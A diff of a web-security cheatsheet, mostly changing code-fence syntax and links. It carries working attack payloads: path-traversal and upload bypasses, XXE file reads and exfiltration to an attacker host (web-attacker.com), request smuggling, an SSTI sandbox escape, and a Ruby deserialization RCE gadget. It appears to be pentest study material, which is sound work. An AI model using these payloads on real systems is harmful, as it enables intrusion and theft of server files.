 
 Pass arbitrary data using the `data://` wrapper in input:
 
-~~~
+```
 data://text/plain;base64,<base64 encoded data>
-~~~
+```
 
 Consider the following code:
 
-~~~php
+```php
 echo json_decode(file_get_contents($userControlledInput), true);
-~~~
+```
 
 Passing a system file path into the `$userControlledInput` WON'T work since the `json_decode` function expects a valid JSON content in the file being read. In order to allow exfiltrating also non-JSON files content, i'ts possible to create a **filter chain** using [wrapwrap](https://github.com/ambionics/wrapwrap) that will prepend and append some chars, making the content JSON-valid:
 
-~~~shell
+```shell
 python wrapwrap.py <file to exfiltrate> <prefix> <suffix> <number of bytes>
 
 # Example
 python wrapwrap.py /etc/passwd '{"x":"' '"}' 1000
 python wrapwrap.py /etc/passwd '"' '"' 1000 # string in quote are JSON valid
-~~~
+```
 
 ### Bypasses
 
-~~~
+```
 ....//                # ./ is getting replaced by something like (./)     
 ....\/
 %2e%2e%2f             # URL Encoding
@@ -1616,7 +1613,7 @@ python wrapwrap.py /etc/passwd '"' '"' 1000 # string in quote are JSON valid
 ..%ef%bc%8f
 /var/www/images/../../../etc/passwd  # App is checking base path
 ../../../etc/passwd%00.png           # App is checking file extension
-~~~
+```
 
 ## File Upload 
 
@@ -1624,27 +1621,27 @@ python wrapwrap.py /etc/passwd '"' '"' 1000 # string in quote are JSON valid
 
 Setup file *Magic Bytes* in order to bypass file type checking:
 
-~~~
+```
 hexeditor -b filename 
-~~~
+```
 
 Useful resource: [File Signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) 
 
 Exploit NGINX virtual directories forcing it to interpet images as PHP (on older version of PHP) - [see there](https://security.stackexchange.com/questions/90968/arbitrary-file-upload-serve-jpg-as-php/90969#90969):
 
-~~~
+```
 /shell.jpg/shell.php
-~~~
+```
 
 Exploit Apache mod_mime extension to force it to interpet images as php (on older version of php) - [see there](https://security.stackexchange.com/questions/90968/arbitrary-file-upload-serve-jpg-as-php/90969#90969):
 
-~~~
+```
 /shell.php.jpg
-~~~
+```
 
 Test multiple PHP extension when .php is not interpeted:
 
-~~~
+```
 phtml
 php
 php3
@@ -1654,20 +1651,20 @@ php7
 php8
 phar
 ... # Consider using a wordlist
-~~~
+```
 
 If there are insufficient restrictions on the file upload, but some principal extensions are anyway blocked (ex: php), try overwriting the WebServer configuration in order to bypass the restrictions:
 
-~~~
+```
 # .htaccess - Run .png as php files
 AddHandler application/x-httpd-php .png
-~~~
+```
 
 For IIS, the config file is `web.config`.
 
 Other  bypasses:
 
-~~~
+```
 exploit.php%00.png # Use null bytes to break parsing
 
 exploit.asp;.jpg  # Use semicolon
@@ -1677,7 +1674,7 @@ exploit.php. # trailing chars such as whitespaces or dot
 exploit%2Ephp # URL encode dot and slashes - Try also to double URL encode
 
 `xC0 x2E`, `xC4 xAE` or `xC0 xAE` may be translated to `x2E`
-~~~
+```
 
 ## XML External Entities Injection (XXE)
 
@@ -1691,9 +1688,9 @@ The XML document type definition (DTD) contains declarations that can define the
 
 Internal entities are locally defined **within the DTD**.
 
-~~~xml
+```xml
 <!ENTITY name "internal_entity_value">
-~~~
+```
 
 
 **XML External Entities**
@@ -1705,38 +1702,38 @@ External Entities can be **private** or **public**:
 - **Private**: the `SYSTEM` keyword indicates that the external entity is private, meaning that its usage is restricted to single user or group of users.
 - **Public**: the `PUBLIC` keyword indicates that the external entity is public, meaning that its usage is intended for a wider audience.
 
-~~~xml
+```xml
 <!-- Private External Entity -->
 <!ENTITY name SYSTEM "external_entity_URI">
 
 <!-- Public External Entity -->
 <!ENTITY name PUBLIC "public_user_or_group_id" "external_entity_URI">
-~~~
+```
 
 Note that XML entities are allowed to store non-XML values. In some constrained parsing scenario (eg. strictly typed language with model binding), in order to prevent the parser to expect these value to be XML-formatted, it's possible to the `NDATA TYPE` declaration to indicate to skip parsing these values.
 
-~~~xml
+```xml
 <!-- Private External Entity -->
 <!ENTITY name SYSTEM "external_entity_URI" NDATA TYPE>
 
 <!-- Public External Entity -->
 <!ENTITY name PUBLIC "public_user_or_group_id" "external_entity_URI" NDATA TYPE>
-~~~
+```
 
 **Note**: when `NDATA TYPE` is not allowed, in order to allow including files containing XML chars such as `<` or `>`, which would otherwise break the parsing, it's necessary to wrap the file content within a `<![CDATA[]]>` section. See payloads below.
 
 **XML Parameters Entities**
 XML parameter entities are a special kind of XML entity which can only be referenced elsewhere **within the DTD**. The declaration of an XML parameter entity as well as its referencing (instead of the `&`) includes the `%` character before the entity name.
 
-~~~xml
+```xml
 <!ENTITY % name SYSTEM "parameter_entity_URI">
-~~~
+```
 
 ### XXE Payloads
 
 XXE File Inclusion:
 
-~~~xml
+```xml
 <!-- Using XML External Entities -->
 <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
 ...
@@ -1746,11 +1743,11 @@ XXE File Inclusion:
 
 <!-- Using XML Parameters Entities -->
 <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe; ]>
-~~~
+```
 
 Bypass including file containing XML characters that break the parsing using an external DTD, wrapping the file content within a  `<![CDATA[]]>` section:
 
-~~~xml
+```xml
 <!-- Remote DTD hosted by attacker -->
 <!ENTITY wrapper "%start;%file;%end;">
 
@@ -1766,12 +1763,12 @@ Bypass including file containing XML characters that break the parsing using an 
 ...
  <bar>&wrapper;</bar>
 ...
-~~~
+```
 
 
 XXE SSRF:
 
-~~~xml
+```xml
 <!-- Using XML External Entities -->
 <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://target"> ]>
 ...
@@ -1781,12 +1778,12 @@ XXE SSRF:
 
 <!-- Using XML Parameters Entities -->
 <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://target"> %xxe; ]>
-~~~
+```
 
 
 XXE by Remote DTD hosted by the attacker:
 
-~~~xml
+```xml
 <!-- Remote DTD hosted at http://attacker/evil.dtd -->
 <!ENTITY % file SYSTEM "file:///etc/passwd">
 <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
@@ -1800,11 +1797,11 @@ XXE by Remote DTD hosted by the attacker:
 
 <!-- Include the remote DTD with parameters entities -->
 <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://attacker/evil.dtd"> %xxe; ]>
-~~~
+```
 
 XXE by remote DTD hosted by the attacker triggering an error to retrieve data:
 
-~~~xml
+```xml
 <!-- Remote DTD hosted at http://attacker/evil.dtd -->
 <!ENTITY % file SYSTEM "file:///etc/passwd">
 <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
@@ -1818,7 +1815,7 @@ XXE by remote DTD hosted by the attacker triggering an error to retrieve data:
 
 <!-- Include the remote DTD with parameters entities -->
 <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://attacker/evil.dtd"> %xxe; ]>
-~~~
+```
 
 **Note**: some XML parsers fetch the URL in the external entity definition using an API that validates the characters that are allowed to appear within the URL so the attack might not work on some file contents containing invalid URL chars like the newline.
 
@@ -1830,21 +1827,21 @@ When an external evil DTD can't be loaded, if the target document's DTD uses a h
 
 - An attacker could employ the error-based technique from within an internal DTD, **provided the XML parameter entity that they use is redefining an entity that is declared within an external DTD**, repurposing it.
 
-~~~xml
+```xml
 <!-- Payload repurposing a local DTD -->
 <!DOCTYPE foo [
 <!ENTITY % local_dtd SYSTEM "file:///<known local DTD path defining the custom_entity entry>">
 <!ENTITY % custom_entity '<!ENTITY &#x25; file SYSTEM "file:///etc/passwd"> <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>"> &#x25;eval; &#x25;error;'>
 %local_dtd;
 ]>
-~~~
+```
 
 **XInclude**
 When the attacker has no control of the whole document, i.e. can't define the DOCTYPE, but controls at least a single item that gets included in a server-side processed XML, it could be possible to exploit the **XInclude** feature
 
 - XInclude allows an XML document to be built from sub-documents
 
-~~~xml
+```xml
 <foo xmlns:xi="http://www.w3.org/2001/XInclude"> <!-- The namespace must be referenced -->
 
 <!-- LFI-->
@@ -1852,7 +1849,7 @@ When the attacker has no control of the whole document, i.e. can't define the DO
 
 <!-- Or SSRF-->
 <xi:include parse="text" href="http://attacker.com"/></foo>
-~~~
+```
 
 **Note**: the `parse` attribute can be valued with "text" or "xml" (default "xml"); when including non-XML files, not setting the `parse` attribute to "text" would trigger an error.
 
@@ -1861,7 +1858,7 @@ Some hidden XXE surface can be found by forcing the content type header in the r
 
 **Soap Envelope**
 
-~~~xml
+```xml
 <?xml version="1.0"?>
 <!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]>
 <soapenv:Envelope xmlns:soapenv="attacker.net">
@@ -1873,7 +1870,7 @@ Some hidden XXE surface can be found by forcing the content type header in the r
 			</changeUserPassword>
 		</soapenv:Body>
 	</soapenv:Envelope>
-~~~
+```
 
 ## Request Smuggling
 
@@ -1886,7 +1883,7 @@ Most HTTP request smuggling vulnerabilities arise because the HTTP/1 specificati
 
 Example of chunk:
 
-~~~
+```
 POST /search HTTP/1.1
 Host: normal-website.com
 Content-Type: application/x-www-form-urlencoded
@@ -1895,7 +1892,7 @@ Transfer-Encoding: chunked
 b
 q=smuggling
 0
-~~~
+```
 
 Websites that use **HTTP/2** end-to-end are inherently immune to request smuggling attacks. As the HTTP/2 specification introduces a single, robust mechanism for specifying the length of a request, there is no way for an attacker to introduce the required ambiguity.
 
@@ -1914,7 +1911,7 @@ Websites that use **HTTP/2** end-to-end are inherently immune to request smuggli
 
 Example of **CL.TE**:
 
-~~~
+```
 POST / HTTP/1.1
 Connection: keep-alive
 Content-Type: application/x-www-form-urlencoded
@@ -1924,7 +1921,7 @@ Transfer-Encoding: chunked
 0
 
 SMUGGLED
-~~~
+```
 
 **TE.CL**
 
@@ -1934,7 +1931,7 @@ SMUGGLED
 
 Example of **TE.CL**:
 
-~~~
+```
 POST / HTTP/1.1
 Host: vulnerable-website.com
 Content-Length: 3 // Note that 3 because of "\r\n" + "8"
@@ -1945,7 +1942,7 @@ SMUGGLED // There insert an HTTP request well formatted (if post, must contain c
 0
 
 
-~~~
+```
 
 \*Note: smuggled content-length must consider the fact that the next request will be included into the body of the smuggled request
 
@@ -1957,7 +1954,7 @@ SMUGGLED // There insert an HTTP request well formatted (if post, must contain c
 
 Example of  `Transfer-Encoding` obfuscation:
 
-~~~
+```
 Transfer-Encoding: xchunked
 
 Transfer-Encoding : chunked
@@ -1973,7 +1970,7 @@ X: X[\n]Transfer-Encoding: chunked
 
 Transfer-Encoding
 : chunked
-~~~
+```
 
 ### HTTP/2
 
@@ -2004,13 +2001,13 @@ HTTP/2 don't have to specify their length explicitly in a header; in a downgrade
 
 Example:
 
-~~~
+```
 GET / HTTP/2
 content-type: application/x-www-form-urlencoded
 content-length: 0
 
 SMUGGLED
-~~~
+```
 
 ##### **H2.TE**
 
@@ -2019,7 +2016,7 @@ SMUGGLED
 
 Example:
 
-~~~
+```
 GET / HTTP/2
 content-type: application/x-www-form-urlencoded
 transfer-encoding: chunked
@@ -2027,7 +2024,7 @@ transfer-encoding: chunked
 0
 
 SMUGGLED
-~~~
+```
 
 ###### **Request Smuggling via CRLF Injection**
 
@@ -2046,7 +2043,7 @@ The key is to smuggle a complete request instead of just a prefix like in the cl
 
 Example:
 
-~~~
+```
 POST / HTTP/1.1\r\n
 Host: vulnerable-website.com\r\n
 Content-Type: x-www-form-urlencoded\r\n
@@ -2061,7 +2058,7 @@ Host: vulnerable-website.com\r\n
 GET / HTTP/1.1\r\n // Next request not being broken
 Host: vulnerable-website.com\r\n
 \r\n
-~~~
+```
 
 ##### **HTTP/2 request splitting**
 
@@ -2131,7 +2128,7 @@ Most likely candidates are endpoints that aren't expecting `POST` requests, such
 
 Javascript exploit code:
 
-~~~javascript
+```javascript
 fetch('https://<target>', {
         method: 'POST',
         body: '<gadget request to smuggle>',
@@ -2143,7 +2140,7 @@ fetch('https://<target>', {
         credentials: 'include'
     })
 })
-~~~
+```
 
 ### Pause-based desync attacks
 
@@ -2169,7 +2166,7 @@ Flow:
 
 Check [this](https://portswigger.net/web-security/request-smuggling/browser/pause-based-desync)for burp usage for testing pause-based desyncs:
 
-~~~python
+```python
 def queueRequests(target, wordlists):
     engine = RequestEngine(endpoint=target.endpoint,
                            concurrentConnections=1, # allow only one connection
@@ -2182,7 +2179,7 @@ def queueRequests(target, wordlists):
 
 def handleResponse(req, interesting):
     table.add(req)
-~~~
+```
 
 ### Bypasses
 
@@ -2192,9 +2189,9 @@ Try adding a `\r` or a ` ` before the headers `content-length` or `transfer-enco
 
 Server-side parameter pollution occurs when a website embeds user input in a server-side request to an internal API without adequate encoding.
 
-~~~
+```
 Request -> Front-End -> Back-End -> Internal API
-~~~
+```
 
 To test for server-side parameter pollution in the query string, place query syntax characters in your input and observe how the application responds:
 
@@ -2204,7 +2201,7 @@ To test for server-side parameter pollution in the query string, place query syn
 
 Examples:
 
-~~~
+```
 // # truncation
 GET /userSearch?name=peter%23foo&back=/home 
 
@@ -2213,7 +2210,7 @@ GET /userSearch?name=peter%26foo=xyz&back=/home
 
 // Parameter overriding with &
 GET /userSearch?name=peter%26name=carlos&back=/home
-~~~
+```
 
 Note: **the same technique is applicable in POST requests!**
 
@@ -2237,7 +2234,7 @@ To detect SSTI:
 
 Identify the template engine in use:
 
-![[ssti-template-engine-identification.png]]
+![ssti-template-engine-identification](../images/web/web-cheatsheet/ssti-template-engine-identification.png)
 
 **Many template engines expose a "self" or "environment" object of some kind, which acts like a namespace containing all objects, methods, and attributes that are supported by the template engine. If such an object exists, you can potentially use it to generate a list of objects that are in scope.**
 
@@ -2249,9 +2246,9 @@ Useful resources:
 
 FreeMarker sandbox bypass (path traversal):
 
-~~~java
+```java
 ${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}
-~~~
+```
 
 ## Unsafe Deserialization
 
@@ -2261,7 +2258,7 @@ PHP does not require explicit type definition in variable declaration. In this c
 
 An attacker can abuse this behaviour in order to bypass restrictions or elevate privileges:
 
-~~~php
+```php
 "5" == 5 // True
 
 0 == 0.0 // True
@@ -2269,7 +2266,7 @@ An attacker can abuse this behaviour in order to bypass restrictions or elevate 
 5 == "5 and a string" // True for PHP < 8
 
 0 == "String without numbers" // True for PHP < 8
-~~~
+```
 
 Note: from PHP 8.0 some loose comparisons are treated differently: [PHP 8.0 Backward Incompatible Changes](https://www.php.net/manual/en/migration80.incompatible.php)
 
@@ -2298,9 +2295,9 @@ Useful resources:
 
  From Java versions 16 and above, you need to set a series of command-line arguments for Java to run ysoserial:
  
-~~~shell
+```shell
 java --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED  --add-opens=java.base/java.net=ALL-UNNAMED --add-opens=java.base/java.util=ALL-UNNAMED -jar ysoserial-all.jar [payload] '[command]'
-~~~
+```
 
 The `URLDNS` chain triggers a DNS lookup for a supplied URL:
 
@@ -2313,7 +2310,7 @@ The `URLDNS` chain triggers a DNS lookup for a supplied URL:
 
 Universal RCE Gadget for  Ruby <= 3.0.2:
 
-~~~ruby
+```ruby
 # Autoload the required classes
 Gem::SpecFetcher
 Gem::Installer
@@ -2353,7 +2350,7 @@ r.instance_variable_set('@requirements', t)
 
 payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
 puts Base64.encode64(payload)
-~~~
+```
 
 ## Web Cache
 
@@ -2456,7 +2453,7 @@ Cache key flaws attacks:
 	- **Exploit 1**:  given the following request `GET /?example=123?excluded_param=<payload>`, the cache server parses (wrongly) two parameters (because of the two `?`) and excludes the second one BUT the application parses only one parameter (the one after the first `?`) and considers the rest as part of the value of this parameter. In the example, if parameter `example` is vulnerable,  the payload will be injected and potentially executed in the cached response.
 	- **Exploit 2**:  give the following request `GET /?keyed_param=abc&excluded_param=123;keyed_param=payload`, the cache server (correctly) parses two parameters and excludes the second one BUT the application might (eg: if using Ruby on Rails) use bot  `&` and `;`  as parameter separators and consider only the last occurrence of the repeated parameter.
 - **Fat GET**: when the cache key is based on the URL, but the server accepts `GET` requests with a body and the value of a parameter is taken from the body instead that from the URL. If the server refuses `GET` requests with a body, it's worth trying override the HTTP method to `POST` with the `X-HTTP-Method-Override` header.
-	- **Key Normalization**: see [[web-cheatsheet#Key normalization|Key Normalization]]. Modern browsers typically URL-encode parameters when sending the request, i.e reflected XSS in query params is typically unexploitable if the server does not URL-decode it. But, if the cache server normalizes the encoded chars when keying a request, an attacker could poison the parameter using the Burp Repeater (no encoding) since, for example, `GET /example?param="><test>` and `GET /example?param=%22%3e%3ctest%3e` will have the same key.
+	- **Key Normalization**: see [Key Normalization](#key-normalization). Modern browsers typically URL-encode parameters when sending the request, i.e reflected XSS in query params is typically unexploitable if the server does not URL-decode it. But, if the cache server normalizes the encoded chars when keying a request, an attacker could poison the parameter using the Burp Repeater (no encoding) since, for example, `GET /example?param="><test>` and `GET /example?param=%22%3e%3ctest%3e` will have the same key.
 - **Cache Key Injection**: if a user controlled input is used as part of the cache key without proper escaping of the delimiters between the components that form the key, it could be possible for an attacker to craft two different request with the same key, making exploitable client-side vulnerabilities that would otherwise be unexploitable. Firstly try deducting what chars are used as delimiters, then check if there's any escaping for these chars.
 - **Internal Cache Poisoning**:some websites implement caching behaviour directly into the application; Instead of caching entire responses, some of these caches break the response down into reusable fragments and cache them each separately. As these cached fragments are intended to be reusable across multiple distinct responses, the concept of a cache key doesn't really apply. Every response that contains a given fragment will reuse the same cached fragment, even if the rest of the response is completely different. Generally, these kind of caches are manipulable with basic web cache poisoning techniques such as manipulating the `Host` header.
 	- if the response reflects a mixture of both input from the last request you sent and input from a previous request, this is a key indicator that the cache is storing fragments rather than entire responses.
@@ -2470,7 +2467,7 @@ Resolving *dot-segments* and *encodings* in a cache key could allow an attacker 
 - **Exploit 2**: A character is used as a delimiter by the origin server but not by the cache: `GET /<Backend_Path><Delimiter><Path_Traversal><Poisoned_Path>` (Es: `/payload$/../home` is normalized as `/home` by the cache server but interpreted as `/payload` by the origin )
 - Exploit 3: A character is used as a delimiter by the cache server but not by the origin, ONLY WHEN the key is normalized and the path is forwarded with the suffix after the delimiter: `GET /<Poisoned_Path><Front-End_Delimiter><Path_Traversal><Backend_Path>` (Es: `/home#/../payload`)
 
-![[cache-server-hashtag-delimiter.png]]
+![cache-server-hashtag-delimiter](../images/web/web-cheatsheet/cache-server-hashtag-delimiter.png)
 
 References:
 
@@ -2484,17 +2481,17 @@ Take a look at [Obfuscating attacks using encodings](https://portswigger.net/web
 
 Bypass path-based WAF restriction appending non-printable and extended-ASCII characters that will be ignored by the server:
 
-~~~
+```
 \x09 # Spring
 \xA0 # Express
 \x1C-1F # Flask
-~~~
+```
 
 ## Generic Bypasses
 
 Use XORing to bypass filters; following a useful script:
 
-~~~python
+```python
 from string import printable, ascii_letters
 import sys
 import re
@@ -2536,15 +2533,15 @@ for c in input_string:
         output_string.append(f"({shellquote(c)})")
 
 print(separator.join(output_string))
-~~~
+```
 
 ## Automatic Testing
 
 Generic `nuclei` scan command:
 
-~~~shell
+```shell
 nuclei -c <number of concurrent templates> -rl <rate limit/concurrent request> -H 'Cookie:  <cookie>' -u <target> -o nuclei-result.txt -sresp
-~~~
+```
 
 - `-c` : set the max number of concurrent templates to run.
 - `-rl`: set the max number of concurrent HTTP requests.
@@ -2553,13 +2550,13 @@ nuclei -c <number of concurrent templates> -rl <rate limit/concurrent request> -
 
 Verb Tampering with `feroxbuster`:
 
-~~~shell
+```shell
 feroxbuster -u <target> -m GET,POST -w /usr/share/dirb/wordlists/small.txt -
 -burp-replay --replay-codes 200,201,301,302,400,401
 
 # Silent and without recursion, useful to pipe output to other users
 feroxbuster --silent -n -u <target> -m GET,POST -w /usr/share/dirb/wordlists/small.txt --burp-replay --replay-codes 200,201,301,302,400,401
-~~~
+```
 
 **Note**:
 
